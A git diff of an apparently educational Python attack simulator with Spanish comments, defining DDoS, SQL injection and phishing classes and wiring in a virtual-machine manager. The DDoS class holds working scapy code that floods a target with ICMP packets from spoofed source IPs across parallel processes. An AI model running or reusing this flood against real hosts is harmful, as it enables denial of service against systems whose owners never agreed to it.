@@ -3,21 +3,19 @@ import random
 import logging
 from abc import ABC, abstractmethod
 from scapy.all import IP, ICMP, send
-import configips
 import multiprocessing
 import time
 from enum import Enum
+from target_machine import VirtualMachineManager
 
-# Configuración de logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-# Definición de Enum para los tipos de ataque
 class AttackType(Enum):
     DDoS = "DDoS"
     SQL_INJECTION = "SQL Injection"
     PHISHING = "Phishing"
 
-# 
+#! Clase abstracta Attack
 class Attack(ABC):
     def __init__(self, attack_type: AttackType, targets: list):
         self.__attack_type = attack_type
@@ -50,7 +48,7 @@ class Attack(ABC):
     def stop(self):
         pass
 
-
+#? Subclase DDoS
 class DDoSAttack(Attack):
     def __init__(self, dst_ip: str, n_ips: int, n_msg: int, interface: str, orig_type: str, threads: int):
         super().__init__(AttackType.DDoS, [dst_ip])
@@ -85,14 +83,13 @@ class DDoSAttack(Attack):
             sys.exit(0)
 
     def send_packet_flood(self, origin_ip):
-        load = "suchaload" * 162  # Carga útil predeterminada
+        load = "suchaload" * 162
         send((IP(dst=self.dst_ip, src=origin_ip) / ICMP() / load) * int(self.n_msg), iface=self.interface, verbose=False)
 
     def start(self):
         self.status = "running"
         print(f"Iniciando ataque DDoS en {self.dst_ip} con {self.n_ips} IPs a una tasa de {self.n_msg} mensajes por IP.")
-        
-        # Enviar paquetes en hilos
+    
         t0 = time.time()
         p = multiprocessing.Pool(self.threads)
         p.map(func=self.send_packet_flood, iterable=self.ips)
@@ -112,7 +109,7 @@ class DDoSAttack(Attack):
         self.status = "stopped"
         print("Ataque DDoS detenido.")
 
-# Subclase para un ataque de SQL Injection
+#? Subclase SQL
 class SQLInjectionAttack(Attack):
     def __init__(self, target_url: str, payload: str):
         super().__init__(AttackType.SQL_INJECTION, [target_url])
@@ -131,7 +128,7 @@ class SQLInjectionAttack(Attack):
         self.status = "stopped"
         print("Ataque SQL Injection detenido.")
 
-# Subclase para un ataque de Phishing
+#? Subclase Phishing
 class PhishingAttack(Attack):
     def __init__(self, target_emails: list, template: str):
         super().__init__(AttackType.PHISHING, target_emails)
@@ -149,3 +146,11 @@ class PhishingAttack(Attack):
     def stop(self):
         self.status = "stopped"
         print("Ataque de phishing detenido.")
+
+
+#* Crear instancias de la clase esa importada
+# Después de como 1 día por fin me di cuenta q tenia que instalar virtualbox como programa y no el SDK :c
+# Ahora si puedo llamar la función pepe c:
+
+vm_manager = VirtualMachineManager()
+vm_manager.pepe()
